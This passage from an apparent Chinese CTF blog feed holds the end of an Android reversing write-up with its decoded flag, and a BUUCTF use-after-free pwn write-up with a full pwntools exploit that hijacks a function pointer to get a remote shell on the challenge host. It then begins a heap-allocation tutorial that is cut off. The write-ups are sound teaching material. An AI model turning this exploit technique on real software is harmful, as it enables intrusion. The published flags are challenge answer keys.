src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9113.png" alt="CTF - REVERSE_Android 逆向13.png"></p><blockquote><p>注意这里 IDA 的 <code>server</code> 要选对，64 位雷电模拟器一般选择 <code>android_x64_server</code></p></blockquote><p>通过 shell 连接雷电模拟器：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">adb shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>到 <code>/data/local/tmp</code> 目录下赋予 <code>android_x64_server</code> 执行权限：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /data/local/tmp <span class="token operator">&amp;&amp;</span> <span class="token function">ls</span><span class="token function">chmod</span> <span class="token number">777</span> android_x64_server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9114.png" alt="CTF - REVERSE_Android 逆向14.png"></p><p>运行 <code>android_x64_server</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./android_x64_server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9115.png" alt="CTF - REVERSE_Android 逆向15.png"></p><p>如果 <code>android_x64_server</code> 在 23946 端口正常开启监听，说明一切正常</p><p>另外开启一个 CMD，将雷电模拟器的端口转发到本机：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">adb forward tcp:23946 tcp:23946   <span class="token comment"># 前面是电脑本机的端口，后面是手机的端口</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>为了让 IDA 能够发现该 APP，在调试模式打开 APP：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">adb shell am start <span class="token parameter variable">-D</span> <span class="token parameter variable">-n</span>  com.ctf.read/com.ctf.read.MainActivity<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>具体名称可以在 <code>资源文件/AndroidManifest.xml</code> 中查看</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9116.png" alt="CTF - REVERSE_Android 逆向16.png"></p><p>雷电模拟器会弹出等待调试的弹窗：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9120.png" alt="CTF - REVERSE_Android 逆向20.png"></p><p>在 IDA 中使用远程 Linux 调试器：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9121.png" alt="CTF - REVERSE_Android 逆向21.png"></p><p>为了防止 apk 反调试，勾选下图中三个调试选项：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9122.png" alt="CTF - REVERSE_Android 逆向22.png"></p><p><code>Hostname</code> 设置为 127.0.0.1，<code>Port</code> 设置为前面转发到本机的端口号，我这里是 23946</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9123.png" alt="CTF - REVERSE_Android 逆向23.png"></p><blockquote><p>如果报错显示拒绝连接，检查转发端口号是否正确，或者重新转发一次</p></blockquote><p>由于 so 文件无法单独运行，因此我们需要 <code>attach</code> 附加进程</p><p>如果前面没出错的话，在 IDA 的 <code>attach</code> 列表里是可以看到该进程的：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9124.png" alt="CTF - REVERSE_Android 逆向24.png"></p><p>找到 <code>buff</code> 存放的地址：<code>0x7FFF5A3772A0</code>，初始时未定义</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9125.png" alt="CTF - REVERSE_Android 逆向25.png"></p><p>设置 jdwp 调试端口</p><p>首先查看一下雷电模拟器中该程序的端口号：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">adb shell <span class="token function">ps</span> <span class="token parameter variable">-ef</span> <span class="token operator">|</span> <span class="token function">grep</span> com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9126.png" alt="CTF - REVERSE_Android 逆向26.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">adb forward tcp:8700 jdwp:3047   <span class="token comment"># 注意将 3047 端口号修改为自己的</span>jdb <span class="token parameter variable">-connect</span> <span class="token string">"com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9127.png" alt="CTF - REVERSE_Android 逆向27.png"></p><p>然后 IDA 图标会闪烁，回到 IDA 就可以正常 F9、正常下断点了</p><p>运行后，<code>buff</code> 存放的地址：<code>0x7FFF5A3772A0</code> 处生成了数据</p><p>提取出来得到密文：<code>jm0g3&#123;djyalj&#123;4og3k1vequwbi:f61:6f;36:;2dkkfAWRjSv2UFDukk</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9128.png" alt="CTF - REVERSE_Android 逆向28.png"></p><p>根据加密逻辑暴力破解：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> enc<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"jm0g3&#123;djyalj&#123;4og3k1vequwbi:f61:6f;36:;2dkkfAWRjSv2UFDukk"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> dec<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">56</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">127</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>j <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">9</span> <span class="token punctuation">)</span>                dec <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">-</span> <span class="token number">45</span> <span class="token operator">-</span> <span class="token number">5</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>j <span class="token operator">-</span> <span class="token number">45</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFE</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x30</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>j <span class="token operator">-</span> <span class="token number">97</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0x19</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>j <span class="token operator">-</span> <span class="token number">65</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0x19</span><span class="token punctuation">)</span>                    dec <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">-</span> <span class="token number">62</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">0x1A</span> <span class="token operator">+</span> <span class="token number">65</span><span class="token punctuation">;</span>            <span class="token keyword">else</span>                dec <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">-</span> <span class="token number">94</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">0x1A</span> <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">;</span>            dec <span class="token operator">=</span> dec <span class="token operator">^</span> <span class="token number">3</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>dec <span class="token operator">==</span> enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">48</span> <span class="token operator">&lt;=</span> j <span class="token operator">&amp;&amp;</span> j <span class="token operator">&lt;=</span> <span class="token number">57</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token number">65</span> <span class="token operator">&lt;=</span> j <span class="token operator">&amp;&amp;</span> j <span class="token operator">&lt;=</span> <span class="token number">90</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token number">97</span> <span class="token operator">&lt;=</span> j <span class="token operator">&amp;&amp;</span> j <span class="token operator">&lt;=</span> <span class="token number">122</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到 flag：<code>fk0a7udfwylfu4ia7e9rcosqDg6b2962b572658deebQNfMr8Ssee</code></p>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
            <tag> IDA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【BUUCTF】hitcontraining_uaf</title>
      <link href="/posts/1cb138a7.html"/>
      <url>/posts/1cb138a7.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p>堆中的 ret2text</p></li><li><p><mark>利用 UAF 漏洞，两次 <code>free</code>，一次 <code>malloc</code>，篡改被释放的堆中的数据为后门函数地址，然后再打印被释放的堆块内容触发后门函数</mark></p></li></ul><hr><p><a href="https://buuoj.cn/challenges#hitcontraining_uaf">【BUUCTF】hitcontraining_uaf</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><blockquote><p>本地环境：Glibc 2.23</p></blockquote><p>查看保护机制：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf1.png" alt="【BUUCTF】hitcontraining_uaf1.png"></p><p>尝试运行：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf2.png" alt="【BUUCTF】hitcontraining_uaf2.png"></p><p>一个经典菜单题，IDA 下分析：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf3.png" alt="【BUUCTF】hitcontraining_uaf3.png"></p><p>主要漏洞发生在 <code>del_note()</code> 中：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf4.png" alt="【BUUCTF】hitcontraining_uaf4.png"></p><p>通过 <code>free</code> 释放内存后未置 0，存在 UAF 漏洞</p><p>同时存在一个后门函数 <code>magic()</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf5.png" alt="【BUUCTF】hitcontraining_uaf5.png"></p><p>结合 GDB 调试，分析一下 <code>add_note()</code> 函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf7.png" alt="【BUUCTF】hitcontraining_uaf7.png"></p><p>验证一下我们的分析，使用一次 <code>add_note(32, b&#39;aaaa&#39;)</code> 后堆结构如下：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf9.png" alt="【BUUCTF】hitcontraining_uaf9.png"></p><p>第一个堆块我们无法控制，它有两个指针，一个指向 <code>print_note_content()</code> 函数，一个指向 <code>note chunk</code>，我们只能控制第二个堆块 <code>note chunk</code> 的 <code>content</code></p><p>为了方便理解，用图表示出来就是这样：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf8.png" alt="【BUUCTF】hitcontraining_uaf8.png"></p><p><code>print_note()</code> 函数用于输出 <code>note chunk</code> 中的 <code>content</code> 内容：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf10.png" alt="【BUUCTF】hitcontraining_uaf10.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf11.png" alt="【BUUCTF】hitcontraining_uaf11.png"></p><blockquote><p>由于存在 UAF 漏洞，于是我们的想法是覆盖 <code>notelist[i][0]</code> 的指针，使其指向 <code>magic()</code> 函数的地址</p><p>我们再通过 <code>print_note()</code> 函数将 <code>notelist[i][1]</code> 指向的 <code>note chunk</code> 打印，就会调用 <code>notelist[i][0]</code> 指向的 <code>magic()</code> 函数获得 shell</p></blockquote><p>首先，创建两个 <code>note chunk</code>（实际上创建了 4 个堆，因为还有 2 个 <code>notelist</code> 堆）：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf12.png" alt="【BUUCTF】hitcontraining_uaf12.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf13.png" alt="【BUUCTF】hitcontraining_uaf13.png"></p><p>分别释放它们：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf14.png" alt="【BUUCTF】hitcontraining_uaf14.png"></p><p>此时如果我们再通过 <code>add_note()</code> 创建 <code>new_note chunk</code></p><p>由于 <code>add_note()</code> 会创建两个堆块，而 <code>fast bin</code> 是后进先出的，会申请到 <code>fastbin[0x10]</code> 中的两个 <code>fast bin</code>，即 <code>0x9f4d038</code> 和 <code>0x9f4d000</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf15.png" alt="【BUUCTF】hitcontraining_uaf15.png"></p><p>然后我们覆盖 <code>new_note chunk</code> 的第一个内容为后门函数 <code>magic()</code> 的地址：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf16.png" alt="【BUUCTF】hitcontraining_uaf16.png"></p><p>由于存在 UAF 漏洞，之前 <code>free</code> 掉的 <code>notelist[0]</code> 和 <code>note chunk 0</code> 依然是可以使用的</p><p>我们其实相当于将之前 <code>notelist[0][0]</code> 指向 <code>print_note_content()</code> 函数的指针篡改为了指向 <code>magic()</code> 函数的指针</p><p>然后调用 <code>print_note()</code> 函数，打印被 <code>free</code> 掉的 <code>note chunk 0</code> 的内容，此时就会执行 <code>notelist[0][0]</code> 处的 <code>magic()</code> 函数，触发后门函数拿到 shell</p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># 设置系统架构, 打印调试信息</span><span class="token comment"># arch 可选 : i386 / amd64 / arm / mips</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># PWN 远程 : content = 0, PWN 本地 : content = 1</span>content <span class="token operator">=</span> <span class="token number">0</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./hacknote"</span><span class="token punctuation">)</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token comment"># 将本地的 Linux 程序启动为进程 io</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./hacknote"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token comment"># 远程程序的 IP 和端口号</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node5.buuoj.cn"</span><span class="token punctuation">,</span> <span class="token number">27407</span><span class="token punctuation">)</span><span class="token comment"># 附加 gdb 调试</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>cmd<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>   <span class="token comment"># 只有本地才可调试，远程无法调试</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>        pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add_note</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Your choice :'</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Note size :'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Content :'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">del_note</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Your choice :'</span><span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index :'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">print_note</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Your choice :'</span><span class="token punctuation">,</span> <span class="token string">"3"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index :'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add_note<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token string">b'aaaa'</span><span class="token punctuation">)</span>add_note<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token string">b'bbbb'</span><span class="token punctuation">)</span>del_note<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>del_note<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>magic_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"magic"</span><span class="token punctuation">]</span>add_note<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span>magic_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>print_note<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment"># 与远程交互</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>flag{6e193074-b875-4c2a-bb9d-3828320fa467}</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf6.png" alt="【BUUCTF】hitcontraining_uaf6.png"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆基础</title>
      <link href="/posts/463ab4ed.html"/>
      <url>/posts/463ab4ed.html</url>
      
        <content type="html"><![CDATA[<h1 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h1><blockquote><p>堆（heap）是一种数据结构，在程序运行的过程中，堆可以提供动态分配的内存，允许程序申请大小未知的内存</p><p>堆是程序虚拟地址空间中的一块连续的线性区域，它<strong>由低地址向高地址方向增长（和栈的增长方向相反）</strong>，管理堆的程序也称为堆管理器</p><p>参考文章：  </p><ol><li><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/heap-overview/">堆概述 - CTF Wiki</a>  </li><li><a href="https://wiki.wgpsec.org/">狼组安全团队公开知识库</a></li></ol></blockquote><p>目前 Linux 标准发行版中使用的堆分配器是 Glibc 中的堆分配器：<code>ptmalloc2</code></p><p>堆的基本操作是分配和回收，<code>ptmalloc2</code> 主要通过 <code>malloc()</code> 和 <code>free()</code> 函数来分配和释放内存块</p><hr><h2 id="堆的基本操作"><a href="#堆的基本操作" class="headerlink" title="堆的基本操作"></a>堆的基本操作</h2><h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><blockquote><p>函数声明：<code>void *malloc(size_t size)</code></p><p><code>size</code> 是内存块的大小，以字节为单位</p></blockquote><p><code>malloc()</code> 的作用是分配所需的内存空间（<em>不会对内存空间进行初始化</em>），并返回一个指向它的指针；如果请求失败，则返回 NULL</p><ul><li><p>当 <code>size = 0</code> 时，返回当前系统允许的堆的最小内存块</p></li><li><p>当 <code>size</code> 为负数时，<strong>由于在大多数系统上，size_t 是无符号数（这一点非常重要）</strong>，所以程序就会申请很大的内存空间，但通常来说都会失败，因为系统没有那么多的内存可以分配</p></li></ul><p>以一个简单的例子来看看 <code>malloc()</code> 函数和堆：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过 GDB 调试可以看到，在执行 <code>malloc()</code> 函数前，程序的地址空间里是没有堆的：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA1.png" alt="CTF - PWN_堆与堆溢出1.png"></p><p>执行 <code>malloc()</code> 函数后：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA2.png" alt="CTF - PWN_堆与堆溢出2.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA3.png" alt="CTF - PWN_堆与堆溢出3.png"></p><p>可见程序中最开始是没有堆这部分空间的，在用户通过 <code>malloc()</code> 申请内存后才会出现，并且会一次性申请很大空间的堆段（<code>0x555555559000 ~ 0x55555557a000</code>）</p><blockquote><p>注意：新版本的 Glibc 对堆结构的管理有些区别，上图是在 Glibc 2.37 的 Kali Linux 2024.1 中进行的测试</p><p>而在 Glibc 2.23 的 Ubuntu 16.04 中是这样的：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA6.png" alt="CTF - PWN_堆与堆溢出6.png"></p></blockquote><hr><h4 id="calloc"><a href="#calloc" class="headerlink" title="calloc"></a>calloc</h4><blockquote><p>函数声明：<code>void *calloc(size_t nitems, size_t size)</code></p><p><code>nitems</code> 为要被分配的元素个数；<code>size</code> 为元素的大小</p></blockquote><p><code>calloc()</code> 在功能上与 <code>malloc()</code> 几乎相同，区别在于 <em><code>calloc()</code> 申请内存空间后会将其全部初始化为 0</em></p><p>使用 <code>calloc()</code> 函数时需要注意，如果分配的内存块过大，可能会导致内存不足的问题</p><hr><h4 id="realloc"><a href="#realloc" class="headerlink" title="realloc"></a>realloc</h4><blockquote><p>函数声明：<code>void *realloc(void *ptr, size_t size)</code></p><p><code>ptr</code> 是一个指向要重新分配内存的内存块的指针；<code>size</code> 是内存块的新的大小，以字节为单位</p></blockquote><p><code>realloc()</code> 的作用是重新调整之前通过 <code>malloc()</code> 或 <code>calloc()</code> 所分配的 <code>ptr</code> 所指向的内存块的大小，并返回一个指向重新分配大小的内存的指针；如果请求失败，则返回 NULL</p><ul><li><p>如果 <code>ptr</code> 为空指针，则会分配一个新的内存块，且函数返回一个指向它的指针，相当于 <code>malloc()</code></p></li><li><p>如果 <code>size = 0</code>，且 <code>ptr</code> 指向一个已存在的内存块，则 <code>ptr</code> 所指向的内存块会被释放，并返回一个空指针，相当于 <code>free()</code></p></li></ul><p>另外，针对重新申请的大小与之前申请内存的大小的关系，又有三种不同的情况：</p><ol><li><p>如果重新申请的大小 &gt; 之前申请内存的大小，且当前内存段后面有需要的内存空间，则直接扩展这段内存空间，<code>realloc()</code> 将返回原指针</p></li><li><p>如果重新申请的大小 &gt; 之前申请内存的大小，且当前内存段后面的空闲空间不够，那么就使用堆中的第一个能够满足这一要求的内存块，将目前的数据复制到新的位置，并将原来的数据块释放掉，返回新的内存块地址，相当于 <code>free() + malloc()</code></p></li><li><p>如果重新申请的大小 &lt; 之前申请内存的大小，堆块会直接缩小，被削减的内存会释放，这里的释放与 <code>free()</code> 不同</p></li></ol><hr><h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><blockquote><p>函数声明：<code>void free(void *ptr)</code></p><p><code>ptr</code> 是一个指向要释放内存的内存块的指针</p></blockquote><p><code>free()</code> 的作用是释放之前通过 <code>malloc()</code>、<code>calloc()</code> 或 <code>realloc()</code> 所分配的内存空间，该函数不返回任何值</p><ul><li><p>如果传递的参数 